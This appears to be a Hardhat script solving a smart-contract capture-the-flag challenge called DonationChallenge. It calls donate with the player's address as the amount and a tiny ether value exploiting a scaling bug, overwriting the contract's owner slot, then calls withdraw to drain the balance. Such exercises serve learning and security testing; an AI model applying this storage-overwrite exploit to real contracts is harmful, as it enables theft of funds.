import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0x969Aa9Dd431E8D741A800FBE42EcFb8559D0905E";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "DonationChallenge",
    challengeAddress
  );

  const scale = ethers.BigNumber.from(10)
    .pow(18)
    .mul(ethers.constants.WeiPerEther);
  const amount = ethers.BigNumber.from(player.address);

  let tx = await challengeContract.donate(amount, { value: amount.div(scale) });
  await tx.wait();

  tx = await challengeContract.withdraw();
  await tx.wait();
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
